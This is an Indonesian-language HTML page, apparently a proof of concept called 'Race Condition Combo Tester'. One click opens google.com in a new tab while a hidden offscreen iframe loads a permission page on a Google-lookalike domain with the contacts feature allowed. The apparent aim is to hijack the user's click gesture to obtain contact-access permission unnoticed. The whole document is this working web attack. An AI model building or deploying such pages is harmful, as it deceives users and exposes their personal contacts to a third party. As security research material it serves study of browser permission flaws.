<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Pages - Dual Trigger Combo</title>
    <style>
        body { 
            font-family: sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #f0f2f5; 
            margin: 0;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        button { 
            padding: 15px 30px; 
            font-size: 16px; 
            font-weight: bold; 
            color: white; 
            background-color: #e03131; 
            border: none; 
            border-radius: 6px; 
            cursor: pointer; 
        }
        button:hover { background-color: #c92a2a; }
        iframe { width: 1px; height: 1px; border: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div class="card">
    <h3>Race Condition Combo Tester</h3>
    <p>Klik tombol di bawah untuk membuka Google.com di tab baru sekaligus memuat target permission di latar belakang.</p>
    
    <button onclick="triggerCombo()">⚡ JALANKAN COMBO (1-CLICK)</button>
</div>

<iframe 
    id="hiddenTargetFrame" 
    src="about:blank" 
    allow="contacts https://googllogoligaturee.my.id">
</iframe>

<script>
    function triggerCombo() {
        const targetUrl = "https://googllogoligaturee.my.id/perm.html?mode=contacts";
        const externalUrl = "https://www.google.com";

        // Aksi 1: Buka Google.com di tab baru menggunakan token gesture utama
        window.open(externalUrl, "_blank", "noopener,noreferrer");

        // Aksi 2: Secara sinkronus (bersamaan) arahkan iframe ke target Anda
        const frame = document.getElementById('hiddenTargetFrame');
        frame.src = targetUrl;
        
        console.log("Combo dieksekusi secara simultan.");
    }
</script>

</body>
</html>
